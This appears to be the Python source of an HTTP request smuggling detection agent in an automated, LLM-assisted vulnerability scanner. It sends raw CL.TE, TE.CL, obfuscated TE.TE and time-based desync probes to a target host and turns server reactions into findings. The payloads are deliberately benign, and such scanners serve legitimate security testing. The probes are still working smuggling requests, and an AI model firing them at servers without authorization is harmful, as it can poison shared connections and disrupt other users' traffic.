"""
HTTPSmugglingAgent — Detects HTTP request smuggling (CL.TE, TE.CL, TE.TE desync).

Techniques:
1. Reverse proxy detection — Via, X-Forwarded-For, Server headers
2. CL.TE desync — Content-Length wins at front-end, Transfer-Encoding at back-end
3. TE.CL desync — Transfer-Encoding wins at front-end, Content-Length at back-end
4. TE.TE desync — Obfuscated Transfer-Encoding headers bypass one proxy layer
5. Time-based detection — CL.TE with delayed response indicating back-end hang

All tests use raw TCP sockets for precise header control.
Benign smuggled payloads only (GET / follow-up requests).

Usage — called by DecisionEngine via test_endpoint():
    agent = HTTPSmugglingAgent(llm_backend="ollama")
    findings = agent.test_endpoint(endpoint, config, state)
"""

import socket
import ssl
import time
from urllib.parse import urlparse

from rich.console import Console

from agents.base import BaseAgent

console = Console()

SOCKET_TIMEOUT = 10  # seconds


# ── Raw socket helpers ────────────────────────────────────────────────────────

def _open_socket(host: str, port: int, use_ssl: bool) -> socket.socket:
    """Open a raw TCP socket, optionally wrapping in TLS."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(SOCKET_TIMEOUT)
    sock.connect((host, port))
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_recv(sock: socket.socket, payload: bytes, read_timeout: float = SOCKET_TIMEOUT) -> bytes:
    """Send raw bytes and read the full response until timeout or close."""
    sock.sendall(payload)
    sock.settimeout(read_timeout)
    chunks = []
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except (socket.timeout, OSError):
        pass
    return b"".join(chunks)


def _parse_status(raw: bytes) -> int:
    """Extract HTTP status code from raw response bytes. Returns 0 on failure."""
    try:
        first_line = raw.split(b"\r\n", 1)[0]
        return int(first_line.split(b" ", 2)[1])
    except Exception:
        return 0


def _parse_response_headers(raw: bytes) -> dict:
    """
    Parse HTTP response headers into a lowercase dict.
    Only looks at the header section (before the body).
    """
    headers = {}
    try:
        header_section = raw.split(b"\r\n\r\n", 1)[0]
        lines = header_section.split(b"\r\n")[1:]  # skip status line
        for line in lines:
            if b":" in line:
                name, _, value = line.partition(b":")
                headers[name.strip().lower().decode(errors="replace")] = (
                    value.strip().decode(errors="replace")
                )
    except Exception:
        pass
    return headers


def _make_finding(url: str, host: str, test_type: str, evidence: str,
                  payload_desc: str, severity: str) -> dict:
    return {
        "validated": True,
        "vuln_type": "http_smuggling",
        "type": f"HTTP Request Smuggling — {test_type}",
        "url": url,
        "param_name": "HTTP framing headers",
        "method": "POST",
        "payload": payload_desc,
        "evidence": evidence,
        "severity": severity,
        "source": "HTTPSmugglingAgent",
    }


# ── Proxy detection ───────────────────────────────────────────────────────────

_PROXY_SERVER_KEYWORDS = ("nginx", "apache", "cloudflare", "haproxy", "varnish",
                          "squid", "envoy", "traefik")


def _detect_reverse_proxy(headers: dict) -> tuple[bool, str]:
    """
    Examine response headers to decide if a reverse proxy is likely in the path.
    Returns (proxy_likely: bool, reason: str).
    """
    if "via" in headers:
        return True, f"Via: {headers['via']}"
    if "x-forwarded-for" in headers:
        return True, f"X-Forwarded-For present"
    server_val = headers.get("server", "").lower()
    for kw in _PROXY_SERVER_KEYWORDS:
        if kw in server_val:
            return True, f"Server: {headers.get('server', '')}"
    return False, "no proxy indicators detected"


# ── Probe builders ────────────────────────────────────────────────────────────

def _build_cl_te_probe(host: str) -> bytes:
    """
    CL.TE desync probe.

    Front-end honours Content-Length (6 bytes: "0\r\n\r\nG").
    Back-end honours Transfer-Encoding and sees the chunk stream end at "0\r\n\r\n",
    then buffers "G" as the start of the next request → "GPOST / HTTP/1.1".
    """
    body = b"0\r\n\r\nG"
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    return request


def _build_follow_up(host: str) -> bytes:
    """Normal GET / to send after a smuggling probe on the same connection."""
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


def _build_te_cl_probe(host: str) -> bytes:
    """
    TE.CL desync probe.

    Front-end honours Transfer-Encoding; sees a single 8-byte chunk ("SMUGGLED")
    then the terminating "0" chunk → forwards the whole thing.
    Back-end honours Content-Length (3) → reads "8\r\n" as body, leaves
    "SMUGGLED\r\n0\r\n\r\n" poisoning the back-end buffer.
    """
    chunk_data = b"SMUGGLED"
    body = (
        f"{len(chunk_data):x}\r\n".encode()
        + chunk_data
        + b"\r\n0\r\n\r\n"
    )
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 3\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    return request


def _build_te_te_probe(host: str, te_header_line: str) -> bytes:
    """
    TE.TE desync probe with an obfuscated Transfer-Encoding header.
    Uses the same body structure as the CL.TE probe (short CL, chunked body).
    """
    body = b"0\r\n\r\nG"
    # Build raw header block manually so we can inject any TE header string
    header_block = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"{te_header_line}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    return header_block.encode() + body


def _build_cl_te_time_probe(host: str) -> bytes:
    """
    Time-based CL.TE probe.

    Content-Length: 4 — front-end forwards exactly "1\r\n" (4 bytes).
    Back-end reads TE chunked: chunk size "1" means read 1 byte ("Z"),
    then waits for the next chunk size — which never arrives → hangs until timeout.
    This hang confirms CL.TE desync without needing a follow-up request.
    """
    # Body: "1\r\nZ" = 4 bytes by Content-Length, but back-end TE expects more
    body = b"1\r\nZ"
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    return request


# ── Individual test methods ───────────────────────────────────────────────────

def _test_cl_te(host: str, port: int, use_ssl: bool, url: str) -> list:
    """
    CL.TE desync: send probe + follow-up on same connection.
    If follow-up gets a 4xx/405 (e.g. "GPOST" is an unknown method) → confirmed.
    """
    findings = []
    try:
        sock = _open_socket(host, port, use_ssl)
        probe = _build_cl_te_probe(host)
        follow_up = _build_follow_up(host)
        # Send both requests back-to-back on the same TCP connection
        sock.sendall(probe + follow_up)
        sock.settimeout(SOCKET_TIMEOUT)
        raw = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                raw += chunk
        except (socket.timeout, OSError):
            pass
        sock.close()

        # Look for a second HTTP response embedded in the data
        # The first response is to the probe; the second (if present) is to the follow-up
        responses = raw.split(b"HTTP/1.1 ")
        if len(responses) >= 3:
            # Third segment = second response body — the follow-up was processed as "GPOST"
            second_status_line = b"HTTP/1.1 " + responses[2].split(b"\r\n")[0]
            status = _parse_status(b"HTTP/1.1 " + responses[2])
            if status in (400, 405, 501) or (status != 0 and status != _parse_status(
                    b"HTTP/1.1 " + responses[1])):
                findings.append(_make_finding(
                    url=url, host=host,
                    test_type="CL.TE",
                    evidence=(
                        f"Follow-up GET / received unexpected HTTP {status} response, "
                        f"suggesting 'GPOST' was prepended by the back-end. "
                        f"Second response status line: {second_status_line.decode(errors='replace')[:120]}"
                    ),
                    payload_desc="POST / with Content-Length:6 + Transfer-Encoding:chunked; body=0\\r\\n\\r\\nG",
                    severity="Critical",
                ))
        elif len(responses) == 2:
            # Only one response — check if it looks like the follow-up was swallowed/mangled
            status = _parse_status(b"HTTP/1.1 " + responses[1])
            if status in (400, 405, 501):
                findings.append(_make_finding(
                    url=url, host=host,
                    test_type="CL.TE",
                    evidence=(
                        f"Single response with HTTP {status} received on CL.TE probe, "
                        "suggesting the smuggled 'G' prefix was processed by the back-end."
                    ),
                    payload_desc="POST / with Content-Length:6 + Transfer-Encoding:chunked; body=0\\r\\n\\r\\nG",
                    severity="Critical",
                ))
    except Exception:
        pass
    return findings


def _test_te_cl(host: str, port: int, use_ssl: bool, url: str) -> list:
    """
    TE.CL desync: send probe + follow-up on same connection.
    Detect if follow-up response differs (extra data prefixed from smuggled body).
    """
    findings = []
    try:
        # First get a clean baseline for a normal GET /
        sock_base = _open_socket(host, port, use_ssl)
        baseline_raw = _send_recv(sock_base, _build_follow_up(host))
        sock_base.close()
        baseline_status = _parse_status(baseline_raw)

        # Now send TE.CL probe + follow-up
        sock = _open_socket(host, port, use_ssl)
        probe = _build_te_cl_probe(host)
        follow_up = _build_follow_up(host)
        sock.sendall(probe + follow_up)
        sock.settimeout(SOCKET_TIMEOUT)
        raw = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                raw += chunk
        except (socket.timeout, OSError):
            pass
        sock.close()

        responses = raw.split(b"HTTP/1.1 ")
        if len(responses) >= 3:
            follow_status = _parse_status(b"HTTP/1.1 " + responses[2])
            if follow_status != 0 and follow_status != baseline_status:
                findings.append(_make_finding(
                    url=url, host=host,
                    test_type="TE.CL",
                    evidence=(
                        f"Follow-up GET / returned HTTP {follow_status} (baseline: {baseline_status}). "
                        "Indicates smuggled 'SMUGGLED' prefix was prepended to the follow-up request "
                        "by the back-end, altering its interpretation."
                    ),
                    payload_desc=(
                        "POST / with Transfer-Encoding:chunked + Content-Length:3; "
                        "chunked body: 8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n"
                    ),
                    severity="Critical",
                ))
    except Exception:
        pass
    return findings


def _test_te_te(host: str, port: int, use_ssl: bool, url: str) -> list:
    """
    TE.TE desync: cycle through obfuscated Transfer-Encoding headers.
    If one triggers a different follow-up status than a normal request → confirmed.
    """
    # (header_label, raw header line to inject)
    obfuscations = [
        ("xchunked",          "Transfer-Encoding: xchunked"),
        ("space-before-colon","Transfer-Encoding : chunked"),
        ("double-TE",         "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
        ("tab-value",         "Transfer-Encoding:\tchunked"),
    ]

    findings = []

    # Baseline follow-up status
    try:
        sock_base = _open_socket(host, port, use_ssl)
        baseline_raw = _send_recv(sock_base, _build_follow_up(host))
        sock_base.close()
        baseline_status = _parse_status(baseline_raw)
    except Exception:
        return findings

    for label, te_line in obfuscations:
        try:
            sock = _open_socket(host, port, use_ssl)
            probe = _build_te_te_probe(host, te_line)
            follow_up = _build_follow_up(host)
            sock.sendall(probe + follow_up)
            sock.settimeout(SOCKET_TIMEOUT)
            raw = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    raw += chunk
            except (socket.timeout, OSError):
                pass
            sock.close()

            responses = raw.split(b"HTTP/1.1 ")
            if len(responses) >= 3:
                follow_status = _parse_status(b"HTTP/1.1 " + responses[2])
                if follow_status != 0 and follow_status != baseline_status:
                    findings.append(_make_finding(
                        url=url, host=host,
                        test_type=f"TE.TE ({label})",
                        evidence=(
                            f"Obfuscated TE header '{te_line}' caused follow-up GET / to return "
                            f"HTTP {follow_status} (baseline: {baseline_status}). "
                            "One proxy layer ignored the malformed header while the other honoured it."
                        ),
                        payload_desc=f"POST / with obfuscated Transfer-Encoding: {te_line!r}",
                        severity="Critical",
                    ))
                    break  # one TE.TE confirmation is sufficient
        except Exception:
            continue

    return findings


def _test_time_based(host: str, port: int, use_ssl: bool, url: str) -> list:
    """
    Time-based CL.TE detection.

    Send a request where front-end uses Content-Length and back-end uses
    Transfer-Encoding. The back-end receives an incomplete chunked body and
    hangs waiting for the rest. A significantly delayed response confirms desync.
    """
    findings = []

    # First measure a quick baseline round-trip (normal GET /)
    try:
        sock_base = _open_socket(host, port, use_ssl)
        t0 = time.monotonic()
        _send_recv(sock_base, _build_follow_up(host), read_timeout=5.0)
        sock_base.close()
        baseline_elapsed = time.monotonic() - t0
    except Exception:
        baseline_elapsed = 0.5  # assume sub-second baseline

    try:
        sock = _open_socket(host, port, use_ssl)
        probe = _build_cl_te_time_probe(host)
        t0 = time.monotonic()
        # Use a shorter read timeout so we don't block the whole scan for 10 s
        _send_recv(sock, probe, read_timeout=6.0)
        elapsed = time.monotonic() - t0
        sock.close()

        # If response took at least 4× the baseline and > 4 s absolute → likely hang
        if elapsed > max(4.0, baseline_elapsed * 4):
            findings.append(_make_finding(
                url=url, host=host,
                test_type="CL.TE (time-based)",
                evidence=(
                    f"Request with Content-Length:4 and chunked body '1\\r\\nZ' caused a "
                    f"{elapsed:.1f}s delay (baseline: {baseline_elapsed:.2f}s). "
                    "Back-end appears to be waiting for the remainder of the chunked body, "
                    "consistent with CL.TE desync where front-end uses Content-Length "
                    "and back-end uses Transfer-Encoding."
                ),
                payload_desc=(
                    "POST / with Content-Length:4 + Transfer-Encoding:chunked; "
                    "body=1\\r\\nZ (incomplete chunked body — no terminating 0 chunk)"
                ),
                severity="High",
            ))
    except Exception:
        pass

    return findings


# ── Agent ─────────────────────────────────────────────────────────────────────

class HTTPSmugglingAgent(BaseAgent):
    agent_name = "HTTPSmugglingAgent"
    vuln_type = "http_smuggling"
    model = "claude-haiku-4-5-20251001"
    max_iterations = 10

    system_prompt = (
        "You are an HTTP request smuggling specialist. "
        "Test ONLY for HTTP desync / smuggling vulnerabilities."
    )

    # ------------------------------------------------------------------
    # Core deterministic test — called by BaseAgent.test_endpoint()
    # ------------------------------------------------------------------

    def _deterministic_test(self, endpoint, config, state) -> list:
        """
        Run all HTTP smuggling probes against the endpoint host using raw sockets.

        Tests (in order):
          1. Reverse proxy detection (informational — adjusts confidence)
          2. CL.TE desync
          3. TE.CL desync
          4. TE.TE desync (four obfuscation variants)
          5. Time-based CL.TE detection

        Returns a list of finding dicts for any confirmed or strongly-suspected issues.
        """
        url = endpoint.url

        parsed = urlparse(url)
        scheme = parsed.scheme.lower()
        host = parsed.hostname or ""
        if not host:
            return []

        use_ssl = scheme == "https"
        port = parsed.port or (443 if use_ssl else 80)

        console.print(
            f"  [cyan]HTTPSmugglingAgent: probing {host}:{port} "
            f"({'TLS' if use_ssl else 'plain'}) for request smuggling...[/]"
        )

        findings = []

        # ── Step 1: Detect reverse proxy via a normal GET ────────────────
        proxy_present, proxy_reason = False, "not checked"
        try:
            sock_probe = _open_socket(host, port, use_ssl)
            probe_raw = _send_recv(sock_probe, _build_follow_up(host), read_timeout=5.0)
            sock_probe.close()
            resp_headers = _parse_response_headers(probe_raw)
            proxy_present, proxy_reason = _detect_reverse_proxy(resp_headers)
        except Exception:
            pass

        if proxy_present:
            console.print(
                f"  [dim]HTTPSmugglingAgent: reverse proxy detected ({proxy_reason}) — "
                "desync tests applicable[/]"
            )
        else:
            console.print(
                f"  [dim]HTTPSmugglingAgent: no proxy indicators ({proxy_reason}) — "
                "testing anyway with lower prior[/]"
            )

        # ── Step 2: CL.TE ────────────────────────────────────────────────
        cl_te_findings = _test_cl_te(host, port, use_ssl, url)
        for f in cl_te_findings:
            if not proxy_present:
                f["evidence"] += " (Note: no reverse proxy detected — confidence lower)"
            findings.append(f)
            console.print(
                f"  [bold red][HTTPSmugglingAgent] CONFIRMED: CL.TE desync @ {url}[/]"
            )

        # ── Step 3: TE.CL ────────────────────────────────────────────────
        te_cl_findings = _test_te_cl(host, port, use_ssl, url)
        for f in te_cl_findings:
            if not proxy_present:
                f["evidence"] += " (Note: no reverse proxy detected — confidence lower)"
            findings.append(f)
            console.print(
                f"  [bold red][HTTPSmugglingAgent] CONFIRMED: TE.CL desync @ {url}[/]"
            )

        # ── Step 4: TE.TE ────────────────────────────────────────────────
        te_te_findings = _test_te_te(host, port, use_ssl, url)
        for f in te_te_findings:
            if not proxy_present:
                f["evidence"] += " (Note: no reverse proxy detected — confidence lower)"
            findings.append(f)
            console.print(
                f"  [bold red][HTTPSmugglingAgent] CONFIRMED: TE.TE desync @ {url}[/]"
            )

        # ── Step 5: Time-based ───────────────────────────────────────────
        # Only run time-based if no confirmed findings yet — avoids redundancy and saves time
        if not findings:
            time_findings = _test_time_based(host, port, use_ssl, url)
            for f in time_findings:
                if not proxy_present:
                    f["evidence"] += " (Note: no reverse proxy detected — confidence lower)"
                findings.append(f)
                console.print(
                    f"  [bold red][HTTPSmugglingAgent] SUSPECTED (time-based): "
                    f"CL.TE desync @ {url}[/]"
                )

        return findings
